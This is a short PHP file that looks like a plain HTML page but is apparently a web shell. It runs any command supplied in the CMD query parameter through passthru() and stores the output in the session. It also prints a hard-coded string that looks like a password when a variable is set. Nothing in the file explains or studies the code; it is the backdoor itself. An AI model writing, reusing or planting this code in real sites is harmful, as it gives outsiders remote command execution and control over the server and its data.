<?php

session_start();

?>

<HTML>
	<HEAD>
		<META NAME="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
		<TITLE></TITLE>
	</HEAD>
	<BODY>
	
<?php

$cmd_ = isset( $_GET['CMD'] ) ? $_GET['CMD'] : null;
$out_ = isset( $_SESSION['OUT'] ) ? $_SESSION['OUT'] : "";

if($cmd_ != null)
{
	passthru( $cmd_, $out_ );
	$out_ = $out_ . "</br>";
}
if( isset($pass) )
{
	echo("sas*0125");
}
(string)$_SESSION['OUT'] = (string)$out_;
?>




</BODY>
</HTML>


